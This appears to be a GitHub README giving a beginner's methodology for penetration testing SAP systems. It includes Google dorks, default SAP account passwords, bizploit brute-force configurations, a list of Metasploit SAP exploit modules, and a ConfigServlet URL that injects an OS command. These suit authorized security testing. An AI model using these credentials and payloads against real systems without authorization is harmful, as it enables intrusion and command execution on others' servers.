# mySapAdventures
A quick methodology on testing/hacking SAP Applications for n00bz

by: Jay Turla @shipcod3

## Discovery
- Check the Application Scope for testing
- Use OSINT (open source intelligence), Shodan and Google Dorks to check for files, subdomains, and juicy information if the application is Internet-facing or public:
```
inurl:50000/irj/portal
inurl:IciEventService/IciEventConf
inurl:/wsnavigator/jsps/test.jsp
inurl:/irj/go/km/docs/
```
- Use nmap to check for open ports and known services (sap routers, webdnypro, web services, web servers, etc.)
- Crawl the URLs if there is a web server running.
- Fuzz the directories (you can use Burp Intruder) if it has web servers on certain ports. Here are some good wordlists provided by the [SecLists Project](https://github.com/danielmiessler/SecLists) for finding default SAP ICM Paths and other interesting directories or files:
```
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web_Content/URLs/urls_SAP.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web_Content/CMS/SAP.fuzz.txt
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web_Content/sap.txt
```
- Run [bizploit](https://www.onapsis.com/research/free-solutions)'s discovery plugins (note: customized script from davehardy20):
```
targets
	addTarget
		set host <host / ip addresses>
	back
	discoverConnectors all
	set mode sap
	back
	show
back
plugins
	discovery getClients
	discovery config getClients
	back
	discovery findRegRFCServers
	discovery config findRegRFCServers
		set regTpnames rfcexec,execute,exec,run,IGS,sapgw,sapgw00,sapgw01,sapgw02,sapgw03,NSP,GATEWAY,GATEWAY 0
	back
	discovery getSaprouterInfo
	back
	discovery getApplicationServers
	discovery icmURLScan
	discovery ping
  back
back
start
```
- Use the [SAP SERVICE DISCOVERY](https://www.rapid7.com/db/modules/auxiliary/scanner/sap/sap_service_discovery) auxiliary Metasploit module for enumerating SAP instances/services/components:
```
msf > use auxiliary/scanner/sap/sap_service_discovery
msf auxiliary(sap_service_discovery) > show options

Module options (auxiliary/scanner/sap/sap_service_discovery):

   Name         Current Setting  Required  Description
   ----         ---------------  --------  -----------
   CONCURRENCY  10               yes       The number of concurrent ports to check per host
   INSTANCES    00-01            yes       Instance numbers to scan (e.g. 00-05,00-99)
   RHOSTS                        yes       The target address range or CIDR identifier
   THREADS      1                yes       The number of concurrent threads
   TIMEOUT      1000             yes       The socket connect timeout in milliseconds

msf auxiliary(sap_service_discovery) > set rhosts 192.168.96.101
rhosts => 192.168.96.101
msf auxiliary(sap_service_discovery) > run

[*] 192.168.96.101:       - [SAP] Beginning service Discovery '192.168.96.101'
```
- Document the findings.

## Testing the Thick Client / SAP GUI
- Here is the command to connect to SAP GUI
```
sapgui <sap server hostname> <system number>
```
- Check for default credentials:
```
SAP* : 06071992, PASS
DDIC : 19920706	
TMSADM : PASSWORD, $1Pawd2&    	
SAPCPIC : ADMIN	
EARLYWATCH: SUPPORT
```
- Run Wireshark then authenticate to the client (SAP GUI) using the credentials you got because some clients transmit credentials without SSL. There are two known plugins for Wireshark that can dissect the main headers used by the SAP DIAG protocol too: [CoreLabs SAP dissection plug-in](https://www.coresecurity.com/corelabs-research/open-source-tools/sap-dissection-plug-in-wireshark) and [SAP DIAG plugin by Positive Research Center](http://blog.ptsecurity.com/2011/10/sap-diag-decompress-plugin-for.html).
- Check for privilege escalations like using some SAP Transaction Codes (tcodes) for low-privilege users:
```
SU01 - To create and maintain the users
SU01D - To Display Users
SU10 - For mass maintenance
SU02 - For Manual creation of profiles
SM19 - Security audit - configuration
SE84 - Information System for SAP R/3 Authorizations
```
- Check if you can execute system commands / run scripts in the client.
- Check if you can do XSS on BAPI Explorer

## Testing the web interface
- Crawl the URLs (see discovery phase).
- Fuzz the URLs like in the discovery phase.
- Look for common web vulnerabilities (Refer to OWASP Top 10) because there are XSS, RCE, XXE, etc. vulnerabilities in some places.
- Check out Jason Haddix's ["The Bug Hunters Methodology"](https://github.com/jhaddix/tbhm) for testing web vulnerabilities.
- Auth Bypass via verb Tampering? Maybe :)

## Attack!
- Check if it runs on old servers or technologies like Windows 2000.
- Plan the possible exploits / attacks, there are a lot of Metasploit modules for SAP discovery (auxiliary modules) and exploits:
```
msf > search sap

Matching Modules
================

   Name                                                                     Disclosure Date  Rank       Description
   ----                                                                     ---------------  ----       -----------
   auxiliary/admin/maxdb/maxdb_cons_exec                                    2008-01-09       normal     SAP MaxDB cons.exe Remote Command Injection
   auxiliary/admin/sap/sap_configservlet_exec_noauth                        2012-11-01       normal     SAP ConfigServlet OS Command Execution
   auxiliary/admin/sap/sap_mgmt_con_osexec                                                   normal     SAP Management Console OSExecute
   auxiliary/dos/sap/sap_soap_rfc_eps_delete_file                                            normal     SAP SOAP EPS_DELETE_FILE File Deletion
   auxiliary/dos/windows/http/pi3web_isapi                                  2008-11-13       normal     Pi3Web ISAPI DoS
   auxiliary/dos/windows/llmnr/ms11_030_dnsapi                              2011-04-12       normal     Microsoft Windows DNSAPI.dll LLMNR Buffer Underrun DoS
   auxiliary/scanner/http/sap_businessobjects_user_brute                                     normal     SAP BusinessObjects User Bruteforcer
   auxiliary/scanner/http/sap_businessobjects_user_brute_web                                 normal     SAP BusinessObjects Web User Bruteforcer
   auxiliary/scanner/http/sap_businessobjects_user_enum                                      normal     SAP BusinessObjects User Enumeration
   auxiliary/scanner/http/sap_businessobjects_version_enum                                   normal     SAP BusinessObjects Version Detection
   auxiliary/scanner/sap/sap_ctc_verb_tampering_user_mgmt                                    normal     SAP CTC Service Verb Tampering User Management
   auxiliary/scanner/sap/sap_hostctrl_getcomputersystem                                      normal     SAP Host Agent Information Disclosure
   auxiliary/scanner/sap/sap_icf_public_info                                                 normal     SAP ICF /sap/public/info Service Sensitive Information Gathering
   auxiliary/scanner/sap/sap_icm_urlscan                                                     normal     SAP URL Scanner
   auxiliary/scanner/sap/sap_mgmt_con_abaplog                                                normal     SAP Management Console ABAP Syslog Disclosure
   auxiliary/scanner/sap/sap_mgmt_con_brute_login                                            normal     SAP Management Console Brute Force
   auxiliary/scanner/sap/sap_mgmt_con_extractusers                                           normal     SAP Management Console Extract Users
   auxiliary/scanner/sap/sap_mgmt_con_getaccesspoints                                        normal     SAP Management Console Get Access Points
   auxiliary/scanner/sap/sap_mgmt_con_getenv                                                 normal     SAP Management Console getEnvironment
   auxiliary/scanner/sap/sap_mgmt_con_getlogfiles                                            normal     SAP Management Console Get Logfile
   auxiliary/scanner/sap/sap_mgmt_con_getprocesslist                                         normal     SAP Management Console GetProcessList
   auxiliary/scanner/sap/sap_mgmt_con_getprocessparameter                                    normal     SAP Management Console Get Process Parameters
   auxiliary/scanner/sap/sap_mgmt_con_instanceproperties                                     normal     SAP Management Console Instance Properties
   auxiliary/scanner/sap/sap_mgmt_con_listlogfiles                                           normal     SAP Management Console List Logfiles
   auxiliary/scanner/sap/sap_mgmt_con_startprofile                                           normal     SAP Management Console getStartProfile
   auxiliary/scanner/sap/sap_mgmt_con_version                                                normal     SAP Management Console Version Detection
   auxiliary/scanner/sap/sap_router_info_request                                             normal     SAPRouter Admin Request
   auxiliary/scanner/sap/sap_router_portscanner                                              normal     SAPRouter Port Scanner
   auxiliary/scanner/sap/sap_service_discovery                                               normal     SAP Service Discovery
   auxiliary/scanner/sap/sap_smb_relay                                                       normal     SAP SMB Relay Abuse
   auxiliary/scanner/sap/sap_soap_bapi_user_create1                                          normal     SAP /sap/bc/soap/rfc SOAP Service BAPI_USER_CREATE1 Function User Creation
   auxiliary/scanner/sap/sap_soap_rfc_brute_login                                            normal     SAP SOAP Service RFC_PING Login Brute Forcer
   auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_call_system_command_exec                   normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Injection
   auxiliary/scanner/sap/sap_soap_rfc_dbmcli_sxpg_command_exec                               normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_COMMAND_EXEC Function Command Injection
   auxiliary/scanner/sap/sap_soap_rfc_eps_get_directory_listing                              normal     SAP SOAP RFC EPS_GET_DIRECTORY_LISTING Directories Information Disclosure
   auxiliary/scanner/sap/sap_soap_rfc_pfl_check_os_file_existence                            normal     SAP SOAP RFC PFL_CHECK_OS_FILE_EXISTENCE File Existence Check
   auxiliary/scanner/sap/sap_soap_rfc_ping                                                   normal     SAP /sap/bc/soap/rfc SOAP Service RFC_PING Function Service Discovery
   auxiliary/scanner/sap/sap_soap_rfc_read_table                                             normal     SAP /sap/bc/soap/rfc SOAP Service RFC_READ_TABLE Function Dump Data
   auxiliary/scanner/sap/sap_soap_rfc_rzl_read_dir                                           normal     SAP SOAP RFC RZL_READ_DIR_LOCAL Directory Contents Listing
   auxiliary/scanner/sap/sap_soap_rfc_susr_rfc_user_interface                                normal     SAP /sap/bc/soap/rfc SOAP Service SUSR_RFC_USER_INTERFACE Function User Creation
   auxiliary/scanner/sap/sap_soap_rfc_sxpg_call_system_exec                                  normal     SAP /sap/bc/soap/rfc SOAP Service SXPG_CALL_SYSTEM Function Command Execution
   auxiliary/scanner/sap/sap_soap_rfc_sxpg_command_exec                                      normal     SAP SOAP RFC SXPG_COMMAND_EXECUTE
   auxiliary/scanner/sap/sap_soap_rfc_system_info                                            normal     SAP /sap/bc/soap/rfc SOAP Service RFC_SYSTEM_INFO Function Sensitive Information Gathering
   auxiliary/scanner/sap/sap_soap_th_saprel_disclosure                                       normal     SAP /sap/bc/soap/rfc SOAP Service TH_SAPREL Function Information Disclosure
   auxiliary/scanner/sap/sap_web_gui_brute_login                                             normal     SAP Web GUI Login Brute Forcer
   exploit/multi/sap/sap_mgmt_con_osexec_payload                            2011-03-08       excellent  SAP Management Console OSExecute Payload Execution
   exploit/multi/sap/sap_soap_rfc_sxpg_call_system_exec                     2013-03-26       great      SAP SOAP RFC SXPG_CALL_SYSTEM Remote Command Execution
   exploit/multi/sap/sap_soap_rfc_sxpg_command_exec                         2012-05-08       great      SAP SOAP RFC SXPG_COMMAND_EXECUTE Remote Command Execution
   exploit/windows/browser/enjoysapgui_comp_download                        2009-04-15       excellent  EnjoySAP SAP GUI ActiveX Control Arbitrary File Download
   exploit/windows/browser/enjoysapgui_preparetoposthtml                    2007-07-05       normal     EnjoySAP SAP GUI ActiveX Control Buffer Overflow
   exploit/windows/browser/sapgui_saveviewtosessionfile                     2009-03-31       normal     SAP AG SAPgui EAI WebViewer3D Buffer Overflow
   exploit/windows/http/sap_configservlet_exec_noauth                       2012-11-01       great      SAP ConfigServlet Remote Code Execution
   exploit/windows/http/sap_host_control_cmd_exec                           2012-08-14       average    SAP NetWeaver HostControl Command Injection
   exploit/windows/http/sapdb_webtools                                      2007-07-05       great      SAP DB 7.4 WebTools Buffer Overflow
   exploit/windows/lpd/saplpd                                               2008-02-04       good       SAP SAPLPD 6.28 Buffer Overflow
   exploit/windows/misc/sap_2005_license                                    2009-08-01       great      SAP Business One License Manager 2005 Buffer Overflow
   exploit/windows/misc/sap_netweaver_dispatcher                            2012-05-08       normal     SAP NetWeaver Dispatcher DiagTraceR3Info Buffer Overflow                   
```
- Try to use some known exploits (check out Exploit-DB) or attacks like the old but goodie "SAP ConfigServlet Remote Code Execution" in the SAP Portal:
```
http://example.com:50000/ctc/servlet/com.sap.ctc.util.ConfigServlet?param=com.sap.ctc.util.FileSystemConfig;EXECUTE_CMD;CMDLINE=uname -a
```
- Before running the ```start``` command on the bizploit script at the Discovery phase, you can also add the following for performing vulnerability assessment:
```
bizploit> plugins
bizploit/plugins> vulnassess all
bizploit/plugins> vulnassess config bruteLogin
bizploit/plugins/vulnassess/config:bruteLogin> set type defaultUsers
bizploit/plugins/vulnassess/config:bruteLogin> set tryHardcodedSAPStar True
bizploit/plugins/vulnassess/config:bruteLogin> set tryUserAsPwd True
bizploit/plugins/vulnassess/config:bruteLogin> back
bizploit/plugins> vulnassess config registerExtServer
bizploit/plugins/vulnassess/config:registerExtServer> set tpname evilgw
bizploit/plugins/vulnassess/config:registerExtServer> back
bizploit/plugins> vulnassess config checkRFCPrivs
bizploit/plugins/vulnassess/config:checkRFCPrivs> set checkExtOSCommands True
bizploit/plugins/vulnassess/config:checkRFCPrivs> back
bizploit/plugins> vulnassess config icmAdmin
bizploit/plugins/vulnassess/config:icmAdmin> set adminURL /sap/admin
bizploit/plugins/vulnassess/config:icmAdmin> back
bizploit/plugins> start
bizploit/plugins> back
bizploit> start
```
## References
- [SAP Penetration Testing Using Metasploit](http://information.rapid7.com/rs/rapid7/images/SAP%20Penetration%20Testing%20Using%20Metasploit%20Final.pdf)
- https://github.com/davehardy20/SAP-Stuff - a script to semi-automate Bizploit
- [SAP NetWeaver ABAP security configuration part 3: Default passwords for access to the application](https://erpscan.com/press-center/blog/sap-netweaver-abap-security-configuration-part-2-default-passwords-for-access-to-the-application/)
- [List of ABAP-transaction codes related to SAP security](https://wiki.scn.sap.com/wiki/display/Security/List+of+ABAP-transaction+codes+related+to+SAP+security)
- [Breaking SAP Portal](https://erpscan.com/wp-content/uploads/presentations/2012-HackerHalted-Breaking-SAP-Portal.pdf)
- [Top 10 most interesting SAP vulnerabilities and attacks](https://erpscan.com/wp-content/uploads/presentations/2012-Kuwait-InfoSecurity-Top-10-most-interesting-vulnerabilities-and-attacks-in-SAP.pdf)
- [Assessing the security of SAP ecosystems with bizploit: Discovery](https://www.onapsis.com/blog/assessing-security-sap-ecosystems-bizploit-discovery)
